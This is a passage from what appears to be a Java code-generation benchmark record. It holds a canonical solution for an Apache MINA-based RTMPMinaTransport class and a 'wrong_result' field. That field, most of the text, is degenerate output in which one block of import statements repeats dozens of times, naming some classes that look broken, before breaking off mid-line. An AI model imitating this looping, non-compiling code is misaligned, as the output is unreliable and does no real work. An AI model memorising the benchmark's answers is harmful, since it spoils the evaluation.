Sets TCP_NODELAY flag\n- setKeepAlive(boolean keepAlive) -> void - Sets socket keep-alive flag\n- setUseHeapBuffers(boolean useHeapBuffers) -> void - Sets heap buffers flag\n- setEnableMinaLogFilter(boolean enableMinaLogFilter) -> void - Enables/disables MINA logging filter\n- setEnableMinaMonitor(boolean enableMinaMonitor) -> void - Enables/disables JMX monitoring\n- setMinaPollInterval(int minaPollInterval) -> void - Sets JMX poll interval\n- setReaderIdleTime(int readerIdleTime) -> void - Sets reader idle time\n- isEnableMinaLogFilter() -> boolean - Returns MINA logging filter status\n- getAddress() -> String - Returns bound addresses as string",
    "Canonical_solution": "import java.lang.management.ManagementFactory;\nimport java.net.InetSocketAddress;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\nimport javax.management.MBeanServer;\nimport javax.management.ObjectName;\nimport javax.management.StandardMBean;\n\nimport org.apache.mina.core.buffer.IoBuffer;\nimport org.apache.mina.core.buffer.SimpleBufferAllocator;\nimport org.apache.mina.core.filterchain.DefaultIoFilterChainBuilder;\nimport org.apache.mina.core.service.AbstractIoService;\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.SimpleIoProcessorPool;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.SocketAcceptor;\nimport org.apache.mina.transport.socket.SocketSessionConfig;\nimport org.apache.mina.transport.socket.nio.NioProcessor;\nimport org.apache.mina.transport.socket.nio.NioSession;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.red5.server.jmx.mxbeans.RTMPMinaTransportMXBean;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class RTMPMinaTransport implements RTMPMinaTransportMXBean {\n\n    private static final Logger log = LoggerFactory.getLogger(RTMPMinaTransport.class);\n\n    private ThreadPoolExecutor executor;\n\n    protected SocketAcceptor acceptor;\n\n    protected Set<String> addresses = new HashSet<String>();\n\n    protected IoHandlerAdapter ioHandler;\n\n    protected int ioThreads = Runtime.getRuntime().availableProcessors() * 2;\n\n    protected ObjectName serviceManagerObjectName;\n\n    protected IoServiceStatistics stats;\n\n    public void start() throws Exception {\n        IoBuffer.setUseDirectBuffer(!useHeapBuffers);\n        if (useHeapBuffers) {\n            IoBuffer.setAllocator(new SimpleBufferAllocator());\n        }\n        if (enableDefaultAcceptor) {\n            acceptor = new NioSocketAcceptor(ioThreads);\n        } else {\n            SimpleIoProcessorPool<NioSession> pool = new SimpleIoProcessorPool<NioSession>(NioProcessor.class, maxProcessorPoolSize);\n            executor = new ThreadPoolExecutor(initialPoolSize, maxPoolSize, executorKeepAliveTime, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>(Short.MAX_VALUE));\n            acceptor = new NioSocketAcceptor(executor, pool);\n        }\n        if (enableMinaLogFilter) {\n            DefaultIoFilterChainBuilder chain = acceptor.getFilterChain();\n            LoggingFilter logFilter = new LoggingFilter(RTMPMinaTransport.class);\n            chain.addLast(\"logger\", logFilter);\n        }\n        acceptor.setCloseOnDeactivation(true);\n        acceptor.setHandler(ioHandler);\n        acceptor.setBacklog(backlog);\n        SocketSessionConfig sessionConf = acceptor.getSessionConfig();\n        sessionConf.setReuseAddress(true);\n        sessionConf.setTcpNoDelay(tcpNoDelay);\n        sessionConf.setSendBufferSize(sendBufferSize);\n        sessionConf.setReceiveBufferSize(receiveBufferSize);\n        sessionConf.setMaxReadBufferSize(receiveBufferSize);\n        sessionConf.setThroughputCalculationInterval(thoughputCalcInterval);\n        sessionConf.setReaderIdleTime(readerIdleTime);\n        sessionConf.setKeepAlive(keepAlive);\n        if (trafficClass != -1) {\n            sessionConf.setTrafficClass(trafficClass);\n        }\n        acceptor.setReuseAddress(true);\n        Set<InetSocketAddress> socketAddresses = new HashSet<InetSocketAddress>();\n        for (String addr : addresses) {\n            if (addr.indexOf(':') != -1) {\n                String[] parts = addr.split(\":\");\n                socketAddresses.add(new InetSocketAddress(parts[0], Integer.valueOf(parts[1])));\n            } else {\n                socketAddresses.add(new InetSocketAddress(addr, 1935));\n            }\n        }\n        acceptor.bind(socketAddresses);\n        if (enableMinaMonitor) {\n            stats = new IoServiceStatistics((AbstractIoService) acceptor);\n            stats.setThroughputCalculationInterval(minaPollInterval);\n            MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();\n            try {\n                serviceManagerObjectName = new ObjectName(\"org.red5.server:type=RTMPMinaTransport\");\n                mbs.registerMBean(new StandardMBean(this, RTMPMinaTransportMXBean.class, true), serviceManagerObjectName);\n            } catch (Exception e) {\n                log.warn(\"Error on jmx registration\", e);\n            }\n        }\n    }\n\n    public void stop() {\n        acceptor.unbind();\n        if (!enableDefaultAcceptor) {\n            executor.shutdownNow();\n        }\n        acceptor.dispose(false);\n        if (serviceManagerObjectName != null) {\n            MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();\n            try {\n                mbs.unregisterMBean(serviceManagerObjectName);\n            } catch (Exception e) {\n                log.warn(\"Error on jmx unregistration\", e);\n            }\n        }\n    }\n\n    public void setAddress(String address) {\n        addresses.add(address);\n    }\n\n    public void setAddresses(List<String> addrs) {\n        for (String addr : addrs) {\n            addresses.add(addr);\n        }\n    }\n\n    public void setIoHandler(IoHandlerAdapter rtmpIOHandler) {\n        this.ioHandler = rtmpIOHandler;\n    }\n\n    public void setIoThreads(int ioThreads) {\n        this.ioThreads = ioThreads;\n    }\n\n    protected boolean enableMinaLogFilter;\n\n    protected boolean enableMinaMonitor;\n\n    protected int minaPollInterval = 1000;\n\n    protected boolean tcpNoDelay = true;\n\n    protected boolean useHeapBuffers = true;\n\n    protected int sendBufferSize = 65536;\n\n    protected int receiveBufferSize = 65536;\n\n    private int readerIdleTime = 2;\n\n    private int trafficClass = 0x08 | 0x10;\n\n    private int backlog = 32;\n\n    private int thoughputCalcInterval = 1;\n\n    private long executorKeepAliveTime = 60000;\n\n    private boolean enableDefaultAcceptor = true;\n\n    private int initialPoolSize = 0;\n\n    private int maxPoolSize = Runtime.getRuntime().availableProcessors() + 1;\n\n    private int maxProcessorPoolSize = 16;\n\n    private boolean keepAlive;\n\n    public void setSendBufferSize(int sendBufferSize) {\n        this.sendBufferSize = sendBufferSize;\n    }\n\n    public void setReceiveBufferSize(int receiveBufferSize) {\n        this.receiveBufferSize = receiveBufferSize;\n    }\n\n    public void setTrafficClass(int trafficClass) {\n        this.trafficClass = trafficClass;\n    }\n\n    public void setBacklog(int backlog) {\n        this.backlog = backlog;\n    }\n\n    public void setThoughputCalcInterval(int thoughputCalcInterval) {\n        this.thoughputCalcInterval = thoughputCalcInterval;\n    }\n\n    public void setExecutorKeepAliveTime(long executorKeepAliveTime) {\n        this.executorKeepAliveTime = executorKeepAliveTime;\n    }\n\n    public void setEnableDefaultAcceptor(boolean enableDefaultAcceptor) {\n        this.enableDefaultAcceptor = enableDefaultAcceptor;\n    }\n\n    public void setInitialPoolSize(int initialPoolSize) {\n        this.initialPoolSize = initialPoolSize;\n    }\n\n    public void setMaxPoolSize(int maxPoolSize) {\n        this.maxPoolSize = maxPoolSize;\n    }\n\n    public void setMaxProcessorPoolSize(int maxProcessorPoolSize) {\n        this.maxProcessorPoolSize = maxProcessorPoolSize;\n    }\n\n    public void setTcpNoDelay(boolean tcpNoDelay) {\n        this.tcpNoDelay = tcpNoDelay;\n    }\n\n    public void setKeepAlive(boolean keepAlive) {\n        this.keepAlive = keepAlive;\n    }\n\n    public void setUseHeapBuffers(boolean useHeapBuffers) {\n        this.useHeapBuffers = useHeapBuffers;\n    }\n\n    public boolean isEnableMinaLogFilter() {\n        return enableMinaLogFilter;\n    }\n\n    public void setEnableMinaLogFilter(boolean enableMinaLogFilter) {\n        this.enableMinaLogFilter = enableMinaLogFilter;\n    }\n\n    public void setEnableMinaMonitor(boolean enableMinaMonitor) {\n        this.enableMinaMonitor = enableMinaMonitor;\n    }\n\n    public void setMinaPollInterval(int minaPollInterval) {\n        this.minaPollInterval = minaPollInterval;\n    }\n\n    public void setReaderIdleTime(int readerIdleTime) {\n        this.readerIdleTime = readerIdleTime;\n    }\n\n    public String getAddress() {\n        return addresses.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 11,
    "wrong_result": "import org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport 